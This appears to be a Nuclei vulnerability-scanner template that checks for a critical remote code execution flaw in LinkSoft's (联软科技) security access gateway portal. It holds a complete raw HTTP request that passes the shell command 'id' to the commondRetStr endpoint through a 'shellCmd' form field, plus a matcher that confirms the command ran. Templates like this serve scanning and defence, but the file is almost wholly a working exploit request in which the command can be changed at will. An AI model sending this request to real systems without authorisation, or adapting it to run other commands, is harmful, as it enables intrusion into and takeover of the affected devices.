id: lrkjzr-commondRetStr-rce


info: 
  name: lrkjzr-commondRetStr-rce
  author: HB
  severity: critical
  description: 联软科技安全准入门户平台commondRetStr存在远程代码执行漏洞

http:
  - raw:
    - |     
      POST /TunnelGateway/commondRetStr HTTP/1.1
      Host: {{Hostname}}
      Cookie: sdp_jsessionid=AA249E70ED8C27AEBF5623728AEA3F41
      User-Agent: Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.9
      Accept: application/json, text/plain, */*
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 11
      Sec-Fetch-Dest: empty
      Sec-Fetch-Mode: cors
      Sec-Fetch-Site: same-origin
      Te: trailers
      Connection: close

      shellCmd=id

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"uid")'
